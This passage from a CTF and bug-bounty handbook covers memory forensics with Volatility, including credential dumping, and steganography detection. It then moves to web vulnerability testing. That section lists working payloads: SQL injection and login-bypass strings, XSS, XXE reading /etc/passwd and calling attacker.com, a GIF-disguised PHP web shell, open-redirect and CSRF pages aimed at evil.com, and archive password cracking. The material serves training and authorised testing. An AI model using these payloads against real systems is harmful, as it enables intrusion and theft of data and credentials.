volatility -f memory.dump --profile=Win7SP1x64 netscan
volatility -f memory.dump --profile=Win7SP1x64 connections  # XP/2003
volatility -f memory.dump --profile=Win7SP1x64 connscan

# Command history
volatility -f memory.dump --profile=Win7SP1x64 cmdscan
volatility -f memory.dump --profile=Win7SP1x64 consoles

# Registry analysis
volatility -f memory.dump --profile=Win7SP1x64 hivelist
volatility -f memory.dump --profile=Win7SP1x64 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"

# File extraction
volatility -f memory.dump --profile=Win7SP1x64 filescan
volatility -f memory.dump --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 --dump-dir=./output
```

**Volatility 3**

```bash
# List available plugins
vol -f memory.dump

# Process information
vol -f memory.dump windows.pslist
vol -f memory.dump windows.pstree
vol -f memory.dump windows.psscan

# Network information
vol -f memory.dump windows.netscan

# Command line
vol -f memory.dump windows.cmdline

# DLL listing
vol -f memory.dump windows.dlllist --pid 1234

# File scan and dump
vol -f memory.dump windows.filescan
vol -f memory.dump -o /output windows.dumpfiles --pid 1234
```

**Process Memory Analysis**

```bash
# Dump specific process
volatility -f memory.dump --profile=Win7SP1x64 memdump -p 1234 -D ./output

# Dump process executable
volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D ./output

# Dump process DLLs
volatility -f memory.dump --profile=Win7SP1x64 dlldump -p 1234 -D ./output

# Strings from process memory
strings output/1234.dmp | grep -i "flag"
strings output/1234.dmp | grep -E "[0-9]{4}-[0-9]{4}-[0-9]{4}"
```

**Credential Extraction**

```bash
# Mimikatz artifacts
volatility -f memory.dump --profile=Win7SP1x64 mimikatz

# LSA secrets
volatility -f memory.dump --profile=Win7SP1x64 lsadump

# Hashdump
volatility -f memory.dump --profile=Win7SP1x64 hashdump

# Password hints
volatility -f memory.dump --profile=Win7SP1x64 printkey -K "Software\Microsoft\Windows\CurrentVersion\Hints"
```

**Browser Artifact Recovery**

```bash
# Scan for browser history
volatility -f memory.dump --profile=Win7SP1x64 iehistory

# Extract Chrome artifacts
volatility -f memory.dump --profile=Win7SP1x64 chromehistory
volatility -f memory.dump --profile=Win7SP1x64 chromedownloads

# Firefox artifacts
volatility -f memory.dump --profile=Win7SP1x64 firefoxhistory
```

**Malware Detection**

```bash
# Scan for injected code
volatility -f memory.dump --profile=Win7SP1x64 malfind -D ./output

# Check for hooks
volatility -f memory.dump --profile=Win7SP1x64 apihooks

# Driver modules
volatility -f memory.dump --profile=Win7SP1x64 modules
volatility -f memory.dump --profile=Win7SP1x64 modscan

# SSDT (System Service Descriptor Table)
volatility -f memory.dump --profile=Win7SP1x64 ssdt
```

### Linux Memory Analysis

**Volatility Linux Profiles**

```bash
# Identify Linux profile
volatility -f memory.lime imageinfo
volatility -f memory.lime --profile=LinuxUbuntu20x64 linux_banner

# Process information
volatility -f memory.lime --profile=LinuxUbuntu20x64 linux_psaux
volatility -f memory.lime --profile=LinuxUbuntu20x64 linux_pstree
volatility -f memory.lime --profile=LinuxUbuntu20x64 linux_pslist

# Network connections
volatility -f memory.lime --profile=LinuxUbuntu20x64 linux_netstat

# Bash history
volatility -f memory.lime --profile=LinuxUbuntu20x64 linux_bash

# Mounted filesystems
volatility -f memory.lime --profile=LinuxUbuntu20x64 linux_mount

# Loaded modules
volatility -f memory.lime --profile=LinuxUbuntu20x64 linux_lsmod

# Dump process memory
volatility -f memory.lime --profile=LinuxUbuntu20x64 linux_proc_maps -p 1234
volatility -f memory.lime --profile=LinuxUbuntu20x64 linux_dump_map -p 1234 -s 0x400000 -D ./output
```

### Memory Forensics Techniques

**String Extraction and Analysis**

```bash
# Extract all strings
strings memory.dump > strings.txt
strings -e l memory.dump > strings_unicode.txt  # Unicode

# Search for specific patterns
strings memory.dump | grep -i "password"
strings memory.dump | grep -E "flag{.*}"
strings memory.dump | grep -E "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"

# Search for base64 encoded data
strings memory.dump | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$"
```

**Hex Analysis**

```bash
# Search for magic bytes
hexdump -C memory.dump | grep "50 4b 03 04"  # ZIP
hexdump -C memory.dump | grep "ff d8 ff"     # JPEG
hexdump -C memory.dump | grep "89 50 4e 47"  # PNG

# Extract file from offset
dd if=memory.dump of=extracted.zip bs=1 skip=12345678 count=1000000
```

**Bulk Extractor**

```bash
# Extract artifacts automatically
bulk_extractor -o output_dir memory.dump

# Output files include:
# - email.txt (email addresses)
# - url.txt (URLs)
# - telephone.txt (phone numbers)
# - ccn.txt (credit card numbers)
# - domain.txt (domain names)

# Search extracted artifacts
grep -i "flag" output_dir/*.txt
```

**Searching for Encryption Keys**

```bash
# RSA private key pattern
strings memory.dump | grep -A 20 "BEGIN RSA PRIVATE KEY"

# AES keys (look for high entropy data)
volatility -f memory.dump --profile=Win7SP1x64 filescan | grep -i "key"

# TrueCrypt/VeraCrypt keys
volatility -f memory.dump --profile=Win7SP1x64 truecryptsummary
volatility -f memory.dump --profile=Win7SP1x64 truecryptmaster
```

### Clipboard and Screenshot Analysis

```bash
# Extract clipboard contents
volatility -f memory.dump --profile=Win7SP1x64 clipboard

# Screenshot from memory
volatility -f memory.dump --profile=Win7SP1x64 screenshot --dump-dir=./output

# GDI objects (may contain images)
volatility -f memory.dump --profile=Win7SP1x64 gditimers
```

### Timeline Analysis

```bash
# Create timeline
volatility -f memory.dump --profile=Win7SP1x64 timeliner --output=body --output-file=timeline.body

# Process with mactime
mactime -b timeline.body -d > timeline.csv
```

### Custom Memory Scanning

**Python Script with Volatility API**

```python
import volatility.conf as conf
import volatility.registry as registry
import volatility.commands as commands
import volatility.addrspace as addrspace

registry.PluginImporter()
config = conf.ConfObject()
config.parse_options()
config.PROFILE = "Win7SP1x64"
config.LOCATION = "file:///path/to/memory.dump"

# Search for pattern in memory
pattern = b"flag{"
for offset in range(0, 0x100000000, 0x1000):
    try:
        data = addr_space.read(offset, 0x1000)
        if pattern in data:
            print(f"Found at offset: {hex(offset)}")
    except:
        pass
```

## Steganography Basics

### Image Steganography

**Basic Detection Tools**

```bash
# File analysis
file image.png
exiftool image.jpg
identify -verbose image.png

# Check for appended data
tail -c 1000 image.jpg | xxd
binwalk image.jpg

# Extract embedded files
binwalk -e image.jpg
foremost image.jpg -o output/
```

**Strings Analysis**

```bash
# Extract strings from image
strings image.jpg | grep -i "flag"
strings image.png | less

# Unicode strings
strings -e l image.jpg

# Search for base64 data
strings image.jpg | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$" | base64 -d
```

**LSB (Least Significant Bit) Steganography**

```bash
# Install zsteg (Ruby tool for PNG/BMP LSB)
gem install zsteg

# Automatic detection
zsteg image.png
zsteg -a image.png  # All possible extractions

# Extract specific bit planes
zsteg -E "b1,rgb,lsb,xy" image.png
zsteg -E "b1,bgr,lsb,xy" image.png > extracted_data.bin

# Check specific channels
zsteg -E "b1,r,lsb,xy" image.png  # Red channel only
zsteg -E "b1,g,lsb,xy" image.png  # Green channel only
zsteg -E "b1,b,lsb,xy" image.png  # Blue channel only
```

**StegSolve - Interactive Analysis**

```bash
# Install
wget http://www.caesum.com/handbook/Stegsolve.jar

# Run
java -jar Stegsolve.jar
```

StegSolve features:

- Browse through bit planes (arrow keys)
- File Format → Data Extract (extract by bit planes)
- Analyze → Frame Browser (for GIF animations)
- Analyse → Image Combiner (XOR, ADD, SUB images)

**LSB Extraction with Python**

```python
from PIL import Image

def extract_lsb(image_path):
    img = Image.open(image_path)
    pixels = img.load()
    width, height = img.size
    
    binary = ''
    for y in range(height):
        for x in range(width):
            pixel = pixels[x, y]
            # Extract LSB from each color channel
            if isinstance(pixel, tuple):
                for value in pixel[:3]:  # RGB only
                    binary += str(value & 1)
            else:
                binary += str(pixel & 1)
    
    # Convert binary to bytes
    data = bytearray()
    for i in range(0, len(binary), 8):
        byte = binary[i:i+8]
        data.append(int(byte, 2))
    
    return bytes(data)

data = extract_lsb('image.png')
print(data[:200])  # Print first 200 bytes
```

**Steghide - Passphrase-Protected**

```bash
# Extract with known passphrase
steghide extract -sf image.jpg -p "password"

# Try without passphrase
steghide extract -sf image.jpg

# Get info about embedded data
steghide info image.jpg

# Brute force passphrase
stegcracker image.jpg wordlist.txt
```

**Outguess**

```bash
# Extract data
outguess -r image.jpg output.txt

# Brute force with wordlist
for pass in $(cat wordlist.txt); do
    outguess -k "$pass" -r image.jpg output.txt 2>/dev/null && echo "Password: $pass"
done
```

### Audio Steganography

**Spectrogram Analysis**

```bash
# Install Sonic Visualiser
apt-get install sonic-visualiser

# Or use Audacity
audacity audio.wav

# Command-line spectrogram
sox audio.wav -n spectrogram -o spectrogram.png
sox audio.wav -n rate 44k spectrogram -x 3000 -y 513 -z 120 -o spec.png

# DeepSound detection (Windows tool)
# Manual inspection in Audacity: Analyze → Plot Spectrum
```

**LSB in Audio (WAV)**

```bash
# Install stegolsb
pip install stego-lsb

# Detect LSB steganography
stegolsb wavsteg -r -i audio.wav -o output.txt -n 2 -b 8000

# Try different LSB configurations
for n in 1 2 4; do
    stegolsb wavsteg -r -i audio.wav -o output_$n.bin -n $n -b 10000
done
```

**DTMF Tone Detection**

```bash
# Detect DTMF tones (phone keypad tones)
multimon-ng -t wav -a DTMF audio.wav

# Or using Python
pip install dtmf-decoder
python3 -c "from dtmf import DTMFDetector; print(DTMFDetector(wav_file='audio.wav').getDTMFfromWAV())"
```

**Morse Code in Audio**

```bash
# Convert audio morse to text
# Analyze in Audacity with Beat Finder
# Or use online decoders with extracted pattern

# Manual timing analysis
sox audio.wav -n stat 2>&1 | grep "RMS.*amplitude"

# Extract morse manually by listening to timing

# Short beep = dot (.)

# Long beep = dash (-)

# Then decode: https://morsecode.world/international/decoder/audio-decoder-adaptive.html
````

**Steganography in MP3/OGG**

```bash
# MP3Stego detection
# Download from: https://www.petitcolas.net/steganography/mp3stego/

# Decode MP3Stego
decode -X -P password input.mp3

# Check metadata
exiftool audio.mp3
ffmpeg -i audio.mp3 2>&1 | grep -i metadata

# Extract cover art (may contain hidden data)
ffmpeg -i audio.mp3 -an -vcodec copy cover.jpg
````

### Video Steganography

**Frame Extraction**

```bash
# Extract all frames
ffmpeg -i video.mp4 frames/frame_%04d.png

# Extract specific frame
ffmpeg -i video.mp4 -vf "select=eq(n\,42)" -vframes 1 frame_42.png

# Extract at intervals
ffmpeg -i video.mp4 -vf fps=1 frames/frame_%03d.png  # 1 frame per second

# Analyze each frame
for frame in frames/*.png; do
    zsteg "$frame" | grep -i "flag"
done
```

**Subtitle Analysis**

```bash
# Extract subtitles
ffmpeg -i video.mp4 -map 0:s:0 subtitles.srt

# Check for hidden messages
cat subtitles.srt | grep -v "^[0-9]" | grep -v "^$" | grep -v "-->"

# Unicode steganography in subtitles
cat subtitles.srt | od -An -tx1 | tr -d ' \n' | grep -o "e2808[0-9a-f]"
```

**Container Analysis**

```bash
# Analyze container structure
ffprobe -v error -show_format -show_streams video.mp4

# Extract metadata
exiftool video.mp4
mediainfo video.mp4

# Check for hidden streams
ffmpeg -i video.mp4 2>&1 | grep Stream

# Extract all data streams
ffmpeg -i video.mp4 -map 0 -c copy -f segment output_%03d
```

### Text-Based Steganography

**Zero-Width Characters**

```bash
# Detect zero-width characters
cat text.txt | od -An -tx1 | grep -E "e2808[0-9a-f]"

# Common zero-width characters:
# U+200B (Zero Width Space): e2 80 8b
# U+200C (Zero Width Non-Joiner): e2 80 8c
# U+200D (Zero Width Joiner): e2 80 8d
# U+FEFF (Zero Width No-Break Space): ef bb bf
```

```python
# Python script to extract zero-width steganography
def extract_zwc(text):
    zwc_chars = {
        '\u200B': '0',  # Zero Width Space
        '\u200C': '1',  # Zero Width Non-Joiner
        '\u200D': '1',  # Zero Width Joiner (alternative)
    }
    
    binary = ''
    for char in text:
        if char in zwc_chars:
            binary += zwc_chars[char]
    
    # Convert binary to text
    result = ''
    for i in range(0, len(binary), 8):
        byte = binary[i:i+8]
        if len(byte) == 8:
            result += chr(int(byte, 2))
    
    return result

with open('text.txt', 'r', encoding='utf-8') as f:
    content = f.read()
    hidden = extract_zwc(content)
    print(hidden)
```

**Whitespace Steganography**

```bash
# Visualize spaces and tabs
cat -A text.txt
# $ = end of line, ^I = tab

# Extract whitespace pattern
cat text.txt | sed 's/[^ \t]//g' | sed 's/ /0/g' | sed 's/\t/1/g'
```

```python
# Decode whitespace steganography
def decode_whitespace(filename):
    with open(filename, 'rb') as f:
        lines = f.readlines()
    
    binary = ''
    for line in lines:
        # Find trailing whitespace
        stripped = line.rstrip(b'\n\r')
        if len(line) > len(stripped):
            ws = line[len(stripped):-1]  # Get whitespace before newline
            for char in ws:
                if char == ord(' '):
                    binary += '0'
                elif char == ord('\t'):
                    binary += '1'
    
    # Convert to ASCII
    result = ''
    for i in range(0, len(binary), 8):
        byte = binary[i:i+8]
        if len(byte) == 8:
            result += chr(int(byte, 2))
    
    return result
```

**Unicode Homoglyphs**

```bash
# Detect non-ASCII characters
file text.txt
iconv -f UTF-8 -t ASCII//TRANSLIT text.txt

# Find suspicious characters
grep -P "[\x80-\xFF]" text.txt
```

```python
# Check for homoglyphs
import unicodedata

def check_homoglyphs(text):
    for i, char in enumerate(text):
        if ord(char) > 127:  # Non-ASCII
            name = unicodedata.name(char, 'UNKNOWN')
            print(f"Position {i}: {char} (U+{ord(char):04X}) - {name}")

with open('text.txt', 'r', encoding='utf-8') as f:
    check_homoglyphs(f.read())
```

### QR Code and Barcode Analysis

**QR Code Extraction**

```bash
# Scan QR codes in image
zbarimg image.png
zbarimg --raw image.png  # Raw output only

# Multiple QR codes
zbarimg -q image.png  # Quiet mode

# From video frames
for frame in frames/*.png; do
    zbarimg "$frame" >> qr_codes.txt
done
```

**Damaged QR Code Recovery**

```python
from pyzbar.pyzbar import decode
from PIL import Image, ImageEnhance, ImageFilter

def enhance_qr(image_path):
    img = Image.open(image_path)
    
    # Try various enhancements
    enhancers = [
        ('Original', img),
        ('Contrast', ImageEnhance.Contrast(img).enhance(2.0)),
        ('Brightness', ImageEnhance.Brightness(img).enhance(1.5)),
        ('Sharpness', ImageEnhance.Sharpness(img).enhance(2.0)),
        ('Threshold', img.convert('L').point(lambda x: 0 if x < 128 else 255, '1')),
    ]
    
    for name, enhanced in enhancers:
        result = decode(enhanced)
        if result:
            print(f"{name}: {result[0].data.decode()}")
            return result[0].data.decode()
    
    return None
```

**QR Code XOR Analysis**

```bash
# Some CTFs hide data by XORing two QR codes
# Combine using ImageMagick
convert qr1.png qr2.png -compose XOR -composite result.png
zbarimg result.png
```

### PDF Steganography

**Metadata Analysis**

```bash
# Extract PDF metadata
exiftool document.pdf
pdfinfo document.pdf

# Extract text
pdftotext document.pdf output.txt

# Extract images
pdfimages -all document.pdf output_prefix

# Analyze PDF structure
pdf-parser document.pdf
qpdf --qdf document.pdf uncompressed.pdf
```

**Hidden Layers and Objects**

```bash
# Extract streams
pdf-parser --search stream document.pdf

# Decompress PDF
qpdf --stream-data=uncompress document.pdf uncompressed.pdf
cat uncompressed.pdf | grep -a "flag"

# Check for JavaScript
pdf-parser --search javascript document.pdf

# Extract embedded files
binwalk -e document.pdf
```

**PDF Steganography Tools**

```bash
# PDFtk - analyze and manipulate
pdftk document.pdf dump_data output metadata.txt
pdftk document.pdf unpack_files output output_dir/

# Peepdf - security analysis
peepdf -i document.pdf
# Within peepdf interactive mode:
# > metadata
# > stream 5
# > object 10
```

### ZIP/Archive Steganography

**Hidden Files in Archives**

```bash
# List archive contents
unzip -l archive.zip
7z l archive.7z
tar -tzf archive.tar.gz

# Check for hidden files (deleted but data remains)
binwalk archive.zip
foremost archive.zip

# Extract all possible files
scalpel archive.zip -o output/
```

**Archive Comment Fields**

```bash
# Check ZIP comment
unzip -z archive.zip

# Extract comment to file
unzip -z archive.zip > comment.txt

# 7z comments
7z l -slt archive.7z | grep -A5 "Comment"
```

**Password-Protected Archives**

```bash
# Detect encryption
7z l archive.7z | grep "Method"
unzip -l archive.zip 2>&1 | grep "encrypted"

# Known-plaintext attack (if you have unencrypted file)
pkcrack -C encrypted.zip -c file.txt -P plaintext.zip -p file.txt -d decrypted.zip

# Brute force with John the Ripper
zip2john archive.zip > hash.txt
john hash.txt --wordlist=rockyou.txt

# fcrackzip
fcrackzip -u -D -p rockyou.txt archive.zip
fcrackzip -b -c aA1! -l 1-6 archive.zip  # Brute force 1-6 chars
```

**Fake CRC/Header Manipulation**

```bash
# Calculate real CRC
crc32 file.txt

# Check for CRC mismatches
unzip -t archive.zip

# Fix corrupted ZIP
zip -FF corrupted.zip --out fixed.zip
```

### Network Packet Steganography

**PCAP Analysis for Hidden Data**

```bash
# Open in Wireshark
wireshark capture.pcap

# Extract HTTP objects
tshark -r capture.pcap --export-objects http,output/

# Extract ICMP payloads
tshark -r capture.pcap -Y "icmp" -T fields -e data | xxd -r -p > icmp_data.bin

# Extract DNS queries
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name

# TCP stream extraction
tshark -r capture.pcap -z follow,tcp,ascii,0 > stream0.txt
```

**ICMP Tunnel Detection**

```bash
# Check ICMP payload size (normal ping = 32-48 bytes)
tshark -r capture.pcap -Y "icmp" -T fields -e data.len

# Extract anomalous ICMP data
tshark -r capture.pcap -Y "icmp && data.len > 100" -T fields -e data | xxd -r -p > hidden.bin
```

**DNS Tunneling Extraction**

```bash
# Extract DNS query names
tshark -r capture.pcap -Y "dns.qry.type == 1" -T fields -e dns.qry.name | sort -u

# Decode base32/base64 in DNS queries
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | \
    sed 's/\..*$//' | \  # Remove domain
    tr -d '\n' | \
    base32 -d  # or base64 -d
```

**HTTP Steganography**

```bash
# Extract all HTTP POST data
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data | xxd -r -p > post_data.bin

# Check for data in headers
tshark -r capture.pcap -Y "http" -T fields -e http.user_agent
tshark -r capture.pcap -Y "http" -T fields -e http.cookie
```

### Steganalysis Tools

**StegExpose - Detection Tool**

```bash
# Install
git clone https://github.com/b3dk7/StegExpose
cd StegExpose
# Follow build instructions

# Run analysis
java -jar StegExpose.jar image.jpg
```

**Stegdetect - Automated Detection**

[Unverified] Stegdetect claims to identify steganography methods in JPEG images:

```bash
# Install stegdetect
apt-get install stegdetect

# Detect steganography
stegdetect image.jpg

# Sensitivity levels
stegdetect -s 10 image.jpg  # Higher sensitivity
```

**Statistical Analysis**

```python
# Chi-square test for LSB steganography detection
from PIL import Image
import numpy as np

def chi_square_test(image_path):
    img = Image.open(image_path)
    pixels = np.array(img)
    
    # Analyze LSB distribution
    lsb_values = pixels.flatten() & 1
    
    # Expected: 50% zeros, 50% ones
    observed = [np.sum(lsb_values == 0), np.sum(lsb_values == 1)]
    expected = [len(lsb_values) / 2, len(lsb_values) / 2]
    
    chi_square = sum((o - e)**2 / e for o, e in zip(observed, expected))
    print(f"Chi-square: {chi_square}")
    print(f"Suspicious: {chi_square > 100}")  # Threshold varies

chi_square_test('image.png')
```

### Advanced Techniques

**Polyglot Files**

```bash
# File that's valid as multiple formats
# Example: PNG + ZIP

# Check file structure
file polyglot.png
unzip -l polyglot.png

# Extract both
cp polyglot.png image.png  # View as image
unzip polyglot.png  # Extract as ZIP
```

**Reversing Image Transforms**

```bash
# ImageMagick transformations
convert original.png -rotate 90 rotated.png
convert original.png -flip flipped.png
convert original.png -flop flopped.png

# Reverse engineer transformations
for transform in "-rotate 90" "-rotate 180" "-rotate 270" "-flip" "-flop"; do
    convert image.png $transform test.png
    zsteg test.png | grep -i "flag" && echo "Found with: $transform"
done
```

**Histogram Analysis**

```python
from PIL import Image
import matplotlib.pyplot as plt

def plot_histogram(image_path):
    img = Image.open(image_path)
    
    # Plot histogram for each channel
    for i, color in enumerate(['Red', 'Green', 'Blue']):
        plt.subplot(3, 1, i + 1)
        histogram = img.histogram()[i*256:(i+1)*256]
        plt.plot(histogram, color=color.lower())
        plt.title(f'{color} Channel')
    
    plt.tight_layout()
    plt.savefig('histogram.png')
    plt.show()

# Irregular patterns may indicate steganography
plot_histogram('suspicious.png')
```

**Color Palette Analysis**

```python
from PIL import Image
from collections import Counter

def analyze_palette(image_path):
    img = Image.open(image_path)
    pixels = img.getdata()
    
    # Count color frequency
    color_count = Counter(pixels)
    
    # Look for rarely used colors (may hide data)
    rare_colors = [c for c, count in color_count.items() if count < 10]
    print(f"Rare colors: {len(rare_colors)}")
    
    # Extract pixels with rare colors
    width, height = img.size
    rare_pixels = []
    for y in range(height):
        for x in range(width):
            if img.getpixel((x, y)) in rare_colors:
                rare_pixels.append((x, y, img.getpixel((x, y))))
    
    return rare_pixels
```

**Automated CTF Stego Pipeline**

```bash
#!/bin/bash
# Comprehensive steganography analysis script

FILE=$1
echo "[*] Analyzing: $FILE"

# Basic checks
echo "[+] File type:"
file "$FILE"

echo "[+] Strings:"
strings "$FILE" | grep -E "(flag|CTF|password)" | head -20

echo "[+] Metadata:"
exiftool "$FILE"

# Format-specific analysis
if [[ "$FILE" == *.png ]] || [[ "$FILE" == *.bmp ]]; then
    echo "[+] Zsteg analysis:"
    zsteg "$FILE"
    
    echo "[+] LSB extraction:"
    zsteg -E "b1,rgb,lsb,xy" "$FILE" > lsb_output.bin
    file lsb_output.bin
    strings lsb_output.bin | head -20
fi

if [[ "$FILE" == *.jpg ]] || [[ "$FILE" == *.jpeg ]]; then
    echo "[+] Steghide (no password):"
    steghide extract -sf "$FILE" -p "" 2>/dev/null || echo "Failed or needs password"
    
    echo "[+] Outguess:"
    outguess -r "$FILE" outguess_output.txt 2>/dev/null || echo "No data found"
fi

# Binary analysis
echo "[+] Binwalk:"
binwalk "$FILE"

echo "[+] Foremost extraction:"
foremost "$FILE" -o foremost_output/ -q

echo "[*] Analysis complete"
```

---

**Related Important Topics:**

- **Reverse Engineering** - Disassembly, decompilation, anti-debugging techniques for analyzing challenge binaries
- **Cryptography Challenges** - Classical ciphers, modern crypto attacks, random number generator flaws
- **Web Assembly (WASM) Exploitation** - Analyzing and exploiting WASM binaries in web challenges

---

# Real-World Integration

## Bug Bounty Methodology

### Reconnaissance Phase

**Subdomain Enumeration:**

```bash
# Using subfinder
subfinder -d target.com -o subdomains.txt

# Using amass
amass enum -d target.com -o amass_subs.txt

# Using assetfinder
assetfinder --subs-only target.com > assetfinder_subs.txt

# DNS brute-forcing with massdns
./scripts/subbrute.py lists/names.txt target.com | \
  ./bin/massdns -r lists/resolvers.txt -t A -o S -w results.txt

# Combine and deduplicate
cat subdomains.txt amass_subs.txt assetfinder_subs.txt | \
  sort -u > all_subdomains.txt
```

**Active subdomain validation:**

```bash
# Check which subdomains are live
cat all_subdomains.txt | httpx -threads 200 -o live_subdomains.txt

# With status codes and titles
httpx -l all_subdomains.txt -status-code -title -tech-detect \
  -o live_detailed.txt
```

**Port scanning:**

```bash
# Fast SYN scan on live hosts
nmap -iL live_subdomains.txt -T4 -Pn --top-ports 1000 \
  -oA nmap_top1000

# Full port scan on key targets
nmap -p- -T4 -Pn target.com -oA nmap_fullscan

# Service detection
nmap -iL targets.txt -sV -sC -Pn -oA nmap_services

# Using masscan for speed
masscan -p1-65535 -iL targets.txt --rate=10000 -oL masscan_results.txt
```

**Technology fingerprinting:**

```bash
# Using whatweb
whatweb -a 3 target.com -v

# Using wappalyzer CLI
wappalyzer target.com

# Using webanalyze
webanalyze -host target.com -crawl 2

# Check for known technologies
curl -I https://target.com | grep -i "server\|x-powered-by"
```

**Content discovery:**

```bash
# Using ffuf
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u https://target.com/FUZZ -mc 200,301,302,401,403

# Using dirsearch
dirsearch -u https://target.com -e php,html,js -x 404,500

# Using feroxbuster (recursive)
feroxbuster -u https://target.com -w wordlist.txt -t 50 --depth 3

# API endpoint discovery
ffuf -w api_wordlist.txt -u https://target.com/api/FUZZ \
  -mc 200,201,204,400,401,403,405
```

**JavaScript analysis:**

```bash
# Extract all JS files
gospider -s https://target.com -c 10 -d 3 --js | \
  grep ".js" > js_files.txt

# Download JS files
cat js_files.txt | while read url; do
  wget "$url" -P js_files/
done

# Search for sensitive info in JS
for file in js_files/*.js; do
  echo "=== $file ==="
  grep -HnE "(api_key|apikey|secret|token|password|aws_|s3_)" "$file"
done

# Extract endpoints from JS
cat js_files/*.js | grep -oE "[\"/][a-zA-Z0-9_/?=&-]+" | \
  sort -u > endpoints.txt
```

**Parameter discovery:**

```bash
# Using Arjun
arjun -u https://target.com/page

# Using ParamSpider
python3 paramspider.py --domain target.com --output params.txt

# Using x8 (hidden parameter discovery)
x8 -u "https://target.com/endpoint" -w params.txt
```

**GitHub reconnaissance:**

```bash
# Using truffleHog
trufflehog git https://github.com/target/repo --regex --entropy=True

# Using GitDorker
python3 GitDorker.py -tf github_tokens.txt -q target.com \
  -d dorks/general.txt

# Manual GitHub dorks
# In GitHub search:
# "target.com" password
# "target.com" api_key
# "target.com" secret
# "target.com" token
# org:target-org password
```

**Google Dorking:**

```bash
# Common dorks for bug bounties
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com inurl:login
site:target.com inurl:dashboard
site:target.com intitle:"index of"
site:target.com ext:php inurl:?id=
site:target.com ext:action
site:target.com inurl:upload
site:*.target.com -www
```

### Vulnerability Discovery Phase

**IDOR (Insecure Direct Object Reference) testing:**

```bash
# Using Burp Intruder
# 1. Capture request with ID parameter
# 2. Send to Intruder
# 3. Set payload position on ID
# 4. Use number range payload (1-1000)
# 5. Look for 200 responses with different content

# Automated IDOR detection
# Create script to test sequential IDs
for id in {1..1000}; do
  response=$(curl -s "https://target.com/api/user/$id" \
    -H "Authorization: Bearer YOUR_TOKEN")
  echo "$id: $response" >> idor_results.txt
done
```

**SQL Injection testing:**

```bash
# Manual testing
# Test single quote
curl "https://target.com/page?id=1'"

# Test boolean-based
curl "https://target.com/page?id=1' AND '1'='1"
curl "https://target.com/page?id=1' AND '1'='2"

# Test time-based
curl "https://target.com/page?id=1' AND SLEEP(5)--"

# Using sqlmap
sqlmap -u "https://target.com/page?id=1" --batch --random-agent \
  --level=5 --risk=3

# Test all parameters in request
sqlmap -r request.txt --batch --random-agent

# Crawl and test
sqlmap -u "https://target.com/" --crawl=2 --batch --random-agent
```

**XSS (Cross-Site Scripting) testing:**

```bash
# Basic payloads
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
"><script>alert(String.fromCharCode(88,83,83))</script>

# Using XSStrike
python3 xsstrike.py -u "https://target.com/search?q=test"

# Using dalfox
dalfox url "https://target.com/search?q=test"

# Reflected XSS hunting with waybackurls + gf
waybackurls target.com | gf xss | \
  qsreplace '"><script>alert(1)</script>' | \
  while read url; do
    curl -s "$url" | grep -q "alert(1)" && echo "Potential XSS: $url"
done
```

**SSRF (Server-Side Request Forgery) testing:**

```bash
# Test with Burp Collaborator or interaction server
# Replace URL parameters with:
http://burp-collaborator-url
http://169.254.169.254/latest/meta-data/
http://localhost/admin
http://127.0.0.1:8080

# Using SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Blind SSRF detection
# Monitor for DNS callbacks
https://target.com/fetch?url=http://unique-id.burpcollaborator.net
```

**XXE (XML External Entity) testing:**

```bash
# Basic XXE payload
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

# Out-of-band XXE
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>

# Test with curl
curl -X POST https://target.com/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'
```

**Authentication bypass testing:**

```bash
# Test default credentials
admin:admin
admin:password
root:root
test:test

# SQL injection in login
admin' OR '1'='1'--
admin'#
' OR 1=1--

# NoSQL injection
{"username": {"$ne": null}, "password": {"$ne": null}}

# JWT testing
# Decode token
echo "JWT_TOKEN" | cut -d "." -f 2 | base64 -d

# Test algorithm confusion
# Change "alg": "RS256" to "alg": "none"
# Remove signature

# Using jwt_tool
python3 jwt_tool.py JWT_TOKEN -X a
```

**File upload vulnerability testing:**

```bash
# Test file extensions
test.php
test.php3
test.php4
test.php5
test.phtml
test.php.jpg
test.jpg.php

# Test content-type bypass
# Upload PHP file with image/jpeg content-type

# Test double extensions
test.jpg.php

# Magic byte manipulation
# Add GIF89a to start of PHP file
GIF89a
<?php system($_GET['cmd']); ?>

# Using upload-scanner
python3 upload-scanner.py -u https://target.com/upload
```

**Open redirect testing:**

```bash
# Common parameters to test
?url=
?redirect=
?next=
?return=
?goto=
?continue=

# Test payloads
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=///evil.com
https://target.com/redirect?url=/\evil.com
https://target.com/redirect?url=javascript:alert(1)
```

**CSRF (Cross-Site Request Forgery) testing:**

```bash
# Check if CSRF token is validated
# 1. Remove CSRF token from request
# 2. Use another user's CSRF token
# 3. Use predictable CSRF token

# Generate CSRF PoC
<html>
  <body>
    <form action="https://target.com/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="submit" value="Submit">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

**Race condition testing:**

```bash
# Using Turbo Intruder (Burp extension)
# Send simultaneous requests to exploit race conditions

# Example: Redeem coupon multiple times
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    
    for i in range(30):
        engine.queue(target.req)

# Command line parallel requests
seq 1 100 | parallel -j 100 curl -X POST \
  https://target.com/redeem -H "Cookie: session=..." \
